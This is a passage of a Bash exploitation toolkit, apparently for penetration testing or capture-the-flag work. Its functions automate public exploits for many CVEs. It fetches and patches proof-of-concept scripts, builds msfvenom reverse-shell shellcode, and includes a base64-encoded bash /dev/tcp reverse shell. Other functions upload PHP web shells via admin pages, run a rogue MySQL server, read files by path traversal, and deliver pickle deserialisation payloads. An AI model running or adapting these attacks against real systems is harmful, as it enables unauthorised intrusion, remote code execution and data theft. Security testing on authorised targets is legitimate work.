    curl -v -k -b $cookie_jar -c $cookie_jar "$target_url/Admin/edit-photo.php" --proxy localhost:8080 \
        -F "avatar=@webshell.php; type=image/jpeg" \
        -F "btnsave="
    curl -v -k "$target_url/uploadImage/webshell.php" --proxy localhost:8080
    popd || exit 1

}


perform_cve_2024_23897() {
    local cve_dir="CVE-2024-23897"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    local path_option=""
    if [[ -z $target_path ]]; then
        echo "target_path is not set"
    else
        path_option="-p $target_path"
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 51993.py ]]; then
        searchsploit -m 51993
    fi
    python3 51993.py -u "$target_url" $path_option | tee >(remove_color_to_log >> "$log_dir/51993.log")
    popd || exit 1
}

perform_cve_2017_12419() {
    local cve_dir="CVE-2017-12419"
    local url="https://github.com/allyshka/Rogue-MySql-Server/archive/refs/heads/master.zip"
    if [[ ! -d $cve_dir ]]; then
        wget $url -O CVE-2017-12419.zip
        unzip CVE-2017-12419.zip
        mv Rogue-MySql-Server-master $cve_dir
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
        echo "host_ip is not set, using default $host_ip"
    fi
    pushd $cve_dir || return 1
    if pgrep -f "php roguemysql.php"; then
        echo "Rogue MySQL server is already running"
        if pgrep -f "curl $target_url/admin/install.php"; then
            echo "Exploit is already running against $target_url"
        else
            curl "$target_url/admin/install.php?install=3&hostname=$host_ip" 
        fi
    else
        php roguemysql.php | tee >(remove_color_to_log >> "$log_dir/12419_rogue_mysql.log") &
    fi
    popd || exit 1

}

perform_cve_2019_15715() {
    local cve_dir="CVE-2019-15715"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "target_ip is not set, using default $target_ip"        
    fi
    if [[ -z $target_port ]]; then
        target_port=80
        echo "target_port is not set, using default $target_port"
    fi
    if [[ -z $target_path ]]; then
        target_path="/"
        echo "target_path is not set, using default $target_path"
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
        echo "host_ip is not set, using default $host_ip"
    fi
    if [[ -z $host_port ]]; then
        host_port=4444
        echo "host_port is not set, using default $host_port"
    fi
    if [[ -z $username ]]; then
        username="administrator"
        echo "username is not set, using default $username"
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 48818.py ]]; then
        searchsploit -m 48818
        2to3 -w 48818.py
    fi
    sed -E -i "s/self\.RHOST = .*/self\.RHOST = \"$(escape_sed "$target_ip")\"/g" 48818.py
    sed -E -i "s/self\.RPORT = .*/self\.RPORT = \"$(escape_sed "$target_port")\"/g" 48818.py
    sed -E -i "s/self\.LHOST = .*/self\.LHOST = \"$(escape_sed "$host_ip")\"/g" 48818.py
    sed -E -i "s/self\.LPORT = .*/self\.LPORT = \"$(escape_sed "$host_port")\"/g" 48818.py
    sed -E -i "s/self\.realname = .*/self\.realname = \"$(escape_sed "$username")\"/g" 48818.py
    sed -E -i "s/self\.passwd = .*/self\.passwd = \"$(escape_sed "$password")\"/g" 48818.py
    sed -E -i "s/self\.mantisLoc = .*/self\.mantisLoc = \"$(escape_sed "$target_path")\"/g" 48818.py
    echo "reverse shell should be updated to encode and decode the base64 object"
    echo '		self.ReverseShell = "echo " + b64encode(("bash -i >& /dev/tcp/" + self.LHOST + "/" + self.LPORT + " 0>&1").encode("utf-8")).decode('utf-8') + " | base64 -d | /bin/bash" # Reverse shell payload'
    echo "def login(self):"
    echo "    self.headers.update({'Content-Type':'application/x-www-form-urlencoded'})"
    echo "comment out reset_login() if not needed"
    echo "#exploit.reset_login()"
    python3 48818.py -u "$target_url" | tee >(remove_color_to_log >> "$log_dir/48818.log")
    popd || exit 1

}

count_hex() {
    local file="${1}"
    if [[ -z $file ]]; then
        echo "Usage: count_hex <file>"
        return 1
    fi
    if [[ ! -f $file ]]; then
        echo "File $file does not exist"
        return 1
    fi
    local count=$(grep -o '\\x[0-9a-fA-F][0-9a-fA-F]' "$file" | wc -l)
    echo "$count"
}

generate_random_string() {
    local length=${1:-16}
    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c "$length"
}

perform_cve_2009_2685() {
    local cve_dir="CVE-2009-2685"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "target_ip is not set, using default $target_ip"        

    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
        echo "host_ip is not set, using default $host_ip"
    fi
    if [[ -z $host_port ]]; then
        host_port=4444
        echo "host_port is not set, using default $host_port"
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 10099.py ]]; then
        searchsploit -m 10099
        2to3 -w 10099.py
    fi
    echo "$host_ip $host_port"
    msfvenom -p windows/shell_reverse_tcp LHOST=$host_ip LPORT=$host_port -f c -e x86/alpha_mixed EXITFUNC=thread -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" > shellcode.txt
    sed -E -i '/^unsigned/d' shellcode.txt
    sed -E -i 's/;//g' shellcode.txt
    echo ")" >> shellcode.txt
    awk  '
        /n00b/ {
            print
            while (getline line) {
                if (line  ~ /^"/) {
                    continue
                }
                next
            }
        }
        { print }
    ' 10099.py > temp.py
    sed -E -i "/n00b/r shellcode.txt" temp.py
    sed -E -i 's/\(evil\)/\(evil\.encode\("latin-1"\))/g' temp.py
    python3 temp.py "$target_ip" | tee >(remove_color_to_log >> "$log_dir/10099.log")
    popd || exit 1

}

perform_cve_2009_3103() {
    local cve_dir="CVE-2009-2532"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "target_ip is not set, using default $target_ip"        
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
        echo "host_ip is not set, using default $host_ip"
    fi
    if [[ -z $host_port ]]; then
        host_port=4444
        echo "host_port is not set, using default $host_port"
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 40280.py ]]; then
        searchsploit -m 40280
        2to3 -w 40280.py
    fi
    if [[ -z $payload ]]; then
        payload="windows/shell/reverse_tcp"
    fi
    echo "$host_ip $host_port"
    msfvenom -p $payload LHOST=$host_ip LPORT=$host_port -f python  > shellcode.txt
    sed -E -i 's/buf/shell/g' shellcode.txt
    #sed -E -i 's/b"/"/g' shellcode.txt
    sed -E -i '/shell = /d' shellcode.txt
    awk  '
        /shell = / {
            print "shell = b\"\""
            while (getline line) {
                if (line  ~ /^shell/) {
                    continue
                }
                next
            }
        }
        { print }
    ' 40280.py > temp.py
    sed -E -i "/shell = /r shellcode.txt" temp.py
    sed -E -i 's/"\\x/b"\\x/g' temp.py
    sed -E -i 's/bb"/b"/g' temp.py
    #sed -E -i 's/send\(buff\)/send\(buff\.decode\(\)\.encode\("latin-1"\)\)/g' temp.py
    #sed -E -i 's/\(evil\)/\(evil\.encode\("latin-1"\))/g' temp.py
    python3 temp.py "$target_ip" | tee >(remove_color_to_log >> "$log_dir/10098.log")
    popd || exit 1

}

perform_cve_2019_7214() {
    local cve_dir="CVE-2019-7214"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_ip ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $target_port ]]; then
        target_port=17001
        echo "target_port is not set, using default $target_port"
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
        echo "host_ip is not set, using default $host_ip"
    fi
    if [[ -z $host_port ]]; then
        host_port=4444
        echo "host_port is not set, using default $host_port"
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 49216.py ]]; then
        searchsploit -m 49216
    fi
    sed -E "s/HOST='.*/HOST='$target_ip'/g" 49216.py > temp.py
    sed -E -i "s/PORT=.*/PORT=$target_port/g" temp.py
    sed -E -i "s/LPORT=.*/LPORT=$host_port/g" temp.py
    sed -E -i "s/LHOST=.*/LHOST='$host_ip'/g" temp.py
    python3 temp.py | tee >(remove_color_to_log >> "$log_dir/49216.log")
    popd || exit 1

}

perform_exploit_49384() {
    local cve_dir="exploit-49384"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_ip ]]; then
        echo "target_ip is not set"
        return 1
    fi
    if [[ -z $target_port ]]; then
        target_port=8082
        echo "target_port is not set, using default $target_port"
    fi
    if [[ -z $cmd ]]; then
        cmd="whoami"
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 49384.txt ]]; then
        searchsploit -m 49384
    fi
    awk '
        /-- Write native library/ {
            
            while (getline line) {
                if (length(line) != 0) {
                    print line                    
                }
                else {
                    break
                }
            }
            next
        }    
    ' 49384.txt > write_native_library.sql

    awk '
        /-- Load native library/ {
            
            while (getline line) {
                if (length(line) != 0) {
                    print line                    
                }
                else {
                    break
                }
            }
            next
        }    
    ' 49384.txt > load_native_library.sql
    awk '
        /-- Evaluate script/ {
            
            while (getline line) {
                if (length(line) != 0) {
                    print line                    
                }
                else {
                    break
                }
            }
            next
        }
    ' 49384.txt > evaluate_script.sql

    page=$(curl -s http://$target_ip:$target_port/login.jsp)
    jsessionid=$(echo "$page" | grep -oP "jsessionid=\\K[^']+")
    echo "jsessionid: $jsessionid"
    curl "http://$target_ip:$target_port/login.do?jsessionid=$jsessionid" \
        -d "language=en" \
        -d "setting=Generic+H2+%28Embedded%29" \
        -d "name=Generic+H2+%28Embedded%29" \
        -d "driver=org.h2.Driver" \
        -d "url=jdbc%3Ah2%3A%7E%2Ftest" \
        -d "user=sa" \
        -d "password="
    sql_cmd=$(cat write_native_library.sql)
    sql_cmd=$(urlencode "$sql_cmd")
    echo "sql=$sql_cmd" > temp.sql
    curl "http://$target_ip:$target_port/query.do?jsessionid=$jsessionid" \
        -d @temp.sql --proxy localhost:8080

    sql_cmd=$(cat load_native_library.sql)
    sql_cmd=$(remove_return "$sql_cmd")
    sql_cmd=$(urlencode "$sql_cmd")
    curl "http://$target_ip:$target_port/query.do?jsessionid=$jsessionid" \
        -d "sql=$sql_cmd" --proxy localhost:8080

    sed -E  "s/whoami/$(escape_sed "$cmd")/g" evaluate_script.sql > temp.sql
    sql_cmd=$(cat temp.sql)
    sql_cmd=$(remove_return "$sql_cmd")
    sql_cmd=$(urlencode "$sql_cmd")
    curl "http://$target_ip:$target_port/query.do?jsessionid=$jsessionid" \
        -d "sql=$sql_cmd" --proxy localhost:8080
    popd || exit 1

}

perform_cve_2020_10199() {
    local cve_dir="CVE-2020-10199"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
    fi
    if [[ -z $username ]]; then
        echo "username is not set"
        return 1
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 49385.py ]]; then
        searchsploit -m 49385
    fi
    local command=$(escape_sed "$cmd")
    local url=$(escape_sed "$target_url")
    sed -E "s/URL=.*/URL='$url'/g" 49385.py > temp.py
    sed -E -i "s/USERNAME=.*/USERNAME='$username'/g" temp.py
    sed -E -i "s/PASSWORD=.*/PASSWORD='$password'/g" temp.py
    sed -E -i "s/CMD=.*/CMD='$command'/g" temp.py
    python temp.py
}

perform_cve_2011_4717() {
    local cve_dir="CVE-2011-4717"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $cmd ]]; then
        cmd="id"
    fi
    pushd $cve_dir || return 1
    if [[ ! -f cve-2011-4717.py ]]; then
        wget "https://raw.githubusercontent.com/mazen160/cve-2011-4717/master/cve-2011-4717.py" -O cve-2011-4717.py
    fi
    sed -E -i "s/target_url = .*/target_url = '$(escape_sed "$target_url")'/g" cve-2011-4717.py
    sed -E -i "s/cmd = .*/cmd = '$(escape_sed "$cmd")'/g" cve-2011-4717.py
    python3 cve-2011-4717.py | tee >(remove_color_to_log >> "$log_dir/2011_4717.log")
    popd || exit 1

}

perform_cve_2022_3218() {
    echo "Exploit for CVE-2022-3218"
    local cve_dir="CVE-2022-3218"
    if [[ -z "$target_ip" ]]; then
        target_ip=$ip
        echo "Target IP not set, using $target_ip"
    fi
    if [[ -z "$payload_name" ]]; then
        create_run_windows_exe
        payload_name="config.yml"
    fi
    if [[ ! -d "$cve_dir" ]]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || return 1
    if [[ ! -f 50972.py ]]; then
        searchsploit -m 50972
    fi
    echo "$target_ip $http_ip $payload_name"
    python3 50972.py $target_ip $http_ip $payload_name
    popd || return 1

}

perform_cve_2021_35448() {
    local cve_dir="CVE-2021-35448"
    local url="https://github.com/p0dalirius/RemoteMouse-3.008-Exploit/archive/refs/heads/master.zip"
    if [[ -z "$target_ip" ]]; then
        target_ip=$ip
        echo "Target IP not set, using $target_ip"
    fi

    if [[ ! -d "$cve_dir" ]]; then
        wget "$url" -O remote_mouse_exploit.zip
        unzip remote_mouse_exploit.zip
        mv RemoteMouse-3.008-Exploit-master "$cve_dir"
        rm remote_mouse_exploit.zip
    fi
    pushd "$cve_dir" || return 1
    python3 RemoteMouse-3.008-Exploit.py --target-ip $target_ip --cmd "$cmd"
    popd || return 1
}


perform_cve_2021_13213() {
    local cve_dir="CVE-2021-13213"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $username ]]; then
        echo "username is not set"
        return 1
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    local base_url=$target_url
    pushd $cve_dir || return 1
    target_url="$base_url/admin/index.php"
    cookie_jar="monstra.cookie.txt"
    #hidden_inputs=$(get_post_hidden_inputs)
    #echo "hidden_inputs=$hidden_inputs"
    response=$(curl -s -L -b $cookie_jar -c $cookie_jar "$target_url" \
        -d "login=$username" \
        -d "password=$password" \
        -d "login_submit=Log+In" \
        --proxy localhost:8080)
    if echo "$response" | grep -q "Dashboard"; then
        echo "Login successful"
    else
        echo "Login failed"
        return 1
    fi
    create_php_web_shell
    local content=$(cat webshell.php)
    content=$(minimize_script "$content")
    content=$(urlencode "$content")
    target_url="$base_url/admin/index.php?id=themes"
    response=$(curl -s -L -b $cookie_jar -c $cookie_jar "$target_url")
    target_url="$base_url/admin/index.php?id=themes&action=add_chunk"
     hidden_inputs=$(get_post_hidden_inputs)
    if echo "$response" | grep -q "shell"; then
        echo "Webshell chunk already exists"
        echo "Going to edit webshell chunk"
        target_url="$base_url/admin/index.php?id=themes&action=edit_chunk&name=shell"
        curl -b $cookie_jar -c $cookie_jar "$target_url" \
            -d "name=shell" \
            -d "chunk_old_name=shell" \
            -d "content=$content" \
            -d "edit_file_and_exit=Save" \
            -d "$hidden_inputs" --proxy localhost:8080
    else
        echo "Uploading new webshell chunk"
        target_url="$base_url/admin/index.php?id=themes&action=add_chunk"
        hidden_inputs=$(get_post_hidden_inputs)
        curl -b $cookie_jar -c $cookie_jar "$target_url" \
            -d "name=shell" \
            -d "content=$content" \
            -d "add_file=Save" \
            -d "$hidden_inputs" --proxy localhost:8080        
    fi
    echo "Executing webshell"
    target_url="$base_url/public/themes/default/shell.chunk.php"
    curl -b $cookie_jar -c $cookie_jar "$target_url" 
    popd || exit 1
    target_url=$base_url
}

#glassfish traversal 4.1
perform_cve_2017_1000028() {
    local cve_dir="CVE-2017-1000028"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $target_path ]]; then
        target_path="windows/win.ini"
        echo "target_path is not set, using default $target_path"
    fi
    pushd $cve_dir || return 1
    local escaped_path="/../../../../../../../../../../"
    escaped_path=$(echo "$escaped_path" | sed -e 's/\//%c0%af/g')
    curl $target_url/theme/com$escaped_path$target_path
    popd || return 1
}

perform_cve_2024_4577() {
    local cve_dir="CVE-2024-4577"
    local url="https://github.com/watchtowrlabs/CVE-2024-4577/archive/refs/heads/main.zip"
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ ! -d $cve_dir ]]; then
        wget $url -O CVE-2024-4577.zip
        unzip CVE-2024-4577.zip
        mv CVE-2024-4577-main $cve_dir
        rm CVE-2024-4577.zip
    fi
    pushd $cve_dir || return 1
    python3 watchTowr-vs-php_cve-2024-4577.py -c "<?php system('$cmd');?>" -t $target_url | tee >(remove_color_to_log >> "$log_dir/cve-2024-4577.log")
    popd || return 1
}

perform_cve_2024_2044() {
    local cve_dir="CVE-2024-2044"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
        cmd=$(encode_bash_payload "$cmd")
    fi
    pushd $cve_dir || return 1
    cp $SCRIPTDIR/../python/cve_2024_2044.py .
    python3 cve_2024_2044.py "$cmd"
    cookie_jar=cve_2024_2044_cookie.txt
    if [[ -f $cookie_jar ]]; then
        rm $cookie_jar
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    local response=$(curl -s -b $cookie_jar -c $cookie_jar "$target_url/login" --proxy localhost:8080)
    csrf_token=$(echo "$response" | grep -oP '"csrfToken": "\K[^"]+')
    echo "csrf_token: $csrf_token"
    curl -s -b $cookie_jar -c $cookie_jar "$target_url/authenticate/login" \
        -d "email=$(urlencode $email)" \
        -d "password=$password" \
        -d "language=en" \
        -d "csrf_token=$csrf_token" \
        -d "internal_button=Login" --proxy localhost:8080 > /dev/null

    curl -s -b $cookie_jar -c $cookie_jar "$target_url/browser/" --proxy localhost:8080 > /dev/null
    response=$(curl -s -b $cookie_jar -c $cookie_jar "$target_url/browser/js/utils.js" --proxy localhost:8080)
    csrf_token_header=$(echo "$response" | grep -oP "\['csrf_token_header'\] = '\K[^']+")
    csrf_token=$(echo "$response" | grep -oP "\['csrf_token'\] = '\K[^']+")
    echo "$csrf_token_header: $csrf_token"
    if [[ -z $csrf_token_header ]] || [[ -z $csrf_token ]]; then
        echo "Failed to extract CSRF token or header"
        return 1
    fi
    response=$(curl -s -b $cookie_jar -c $cookie_jar "$target_url/file_manager/init" \
        -d '{"dialog_type":"storage_dialog","supported_types":["sql","csv","json","*"],"dialog_title":"Storage Manager"}' \
        -H "$csrf_token_header: $csrf_token" \
        -H "Content-Type: application/json" \
        --proxy localhost:8080)
    transId=$(echo $response | jq -r '.data.transId')
    echo "transId: $transId"
    response=$(curl -s -b $cookie_jar -c $cookie_jar "$target_url/file_manager/filemanager/$transId/" \
        -H "Content-Type: application/json" \
        -H "$csrf_token_header: $csrf_token" \
        -d '{"path":"/","mode":"getfolder","file_type":"*","show_hidden":false,"storage_folder":"my_storage"}' \
        --proxy localhost:8080)


    echo "Uploading pickle file"
    curl -s -b $cookie_jar -c $cookie_jar "$target_url/file_manager/filemanager/$transId/" \
        -H "$csrf_token_header: $csrf_token" \
        -F "newfile=@posix.pickle" \
        -F "mode=add" \
        -F "currentpath=/" \
        -F "storage_folder=my_storage" --proxy localhost:8080 > /dev/null
    
    
    sanitized_email=$(echo -n "$email" | sed -E 's/@/_/g')
    session_id="../storage/$sanitized_email/posix.pickle!"
    echo
    echo "session_id: $session_id"
    #sed -E -i "s/pga_session.*/pga4_session\t$session_id/g" $cookie_jar
    curl -s -b "pga4_session=$session_id" "$target_url/login" --proxy localhost:8080 > /dev/null
    popd || exit 1

}

#salt stack exploit
perform_cve_2020_11651() {
    local cve_dir="CVE-2020-11651"
    local url="https://github.com/jasperla/CVE-2020-11651-poc/archive/refs/heads/master.zip"
    if [[ ! -d $cve_dir ]]; then
        wget $url -O CVE-2020-11651.zip
        unzip CVE-2020-11651.zip
        mv CVE-2020-11651-poc-master $cve_dir
        rm CVE-2020-11651.zip
    fi  
    if [[ -z $target_ip ]]; then
        echo "target_ip is not set"
        return 1
    fi
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
        cmd=$(encode_bash_payload "$cmd")
    fi
    pushd $cve_dir || return 1
    python3 exploit.py --master $target_ip --exec "$cmd" | tee >(remove_color_to_log >> "$log_dir/cve-2020-11651.log")
    popd || exit 1

}

#cutenews
register_cutenews_user() {
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $username ]]; then
        username="test"
    fi
    if [[ -z $password ]]; then
        password="password"
    fi
    if [[ -z $email ]]; then
        email="test@example.com"
    fi
    if [[ -z $cookie_jar ]]; then
        cookie_jar="cutenews.cookie.txt"
        echo "cookie_jar is not set, using default $cookie_jar"
    fi
    response=$(curl -b $cookie_jar -c $cookie_jar -s $target_url/captcha.php)
    echo $response
    captcha_code=$(echo "$response" | grep -oP 'Serif;">\K[^<]+')
    echo "captcha_code: $captcha_code"
    curl -b $cookie_jar -c $cookie_jar -s "$target_url/index.php?register" \
        -d "action=register" \
        -d "regusername=$username" \
        -d "regnickname=$username" \
        -d "regpassword=$password" \
        -d "confirm=$password" \
        -d "regemail=$email" \
        -d "captcha=$captcha_code" --proxy localhost:8080 > /dev/null

}


perform_cve_2019_11447() {
    local cve_dir="CVE-2019-11447"
    local url="https://github.com/thewhiteh4t/cve-2019-11447/archive/refs/heads/main.zip"
    if [[ ! -d $cve_dir ]]; then
        wget $url -O CVE-2019-11447.zip
        unzip CVE-2019-11447.zip
        mv cve-2019-11447-main $cve_dir
        rm CVE-2019-11447.zip
    fi
    if [[ -z $target_ip ]]; then
        echo "target_ip is not set"
        return 1
    fi
    if [[ -z $username ]] && [[ -z $password ]]; then
        echo "both username and password are not set"
        echo "Trying to register"
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)  
        echo "host_ip is not set, using default $host_ip"
    fi
    if [[ -z $host_port ]]; then
        host_port=4444
        echo "host_port is not set, using default $host_port"
    fi
    pushd $cve_dir || return 1
    if pgrep -f "python3 cve-2019-11447.py"; then
        echo "Exploit is already running against $target_ip"
    else
        python3 cve-2019-11447.py -t $target_ip -u $username -p $password -lh $host_ip -lp $host_port -f shell
    fi
    popd || exit 1

}